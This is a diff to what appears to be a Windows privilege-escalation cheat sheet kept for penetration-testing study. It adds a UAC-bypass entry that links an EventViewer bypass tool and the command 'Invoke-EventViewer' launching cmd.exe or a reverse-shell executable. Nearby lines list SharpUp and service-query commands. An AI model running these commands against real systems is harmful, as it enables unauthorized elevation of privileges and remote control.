@@ -41,6 +41,8 @@
  9. `.\SharpUp.exe`
  ## UAC 
  1. `powershell.exe Start-Process cmd.exe -Verb runAs` run cmd as high integrity,(this is the case when we have admin access to folder but cant execute admin)
+ 2. https://github.com/CsEnox/EventViewer-UACBypass
+ 3. `Invoke-EventViewer cmd.exe` or `Invoke-EventViewer "C:\full\path\to\reverse.exe`
  ## Service Misconfiguration
 - `sc.exe qc <name>` Query the configuration of a service
 - `sc.exe query <name>`Query the current status of a service
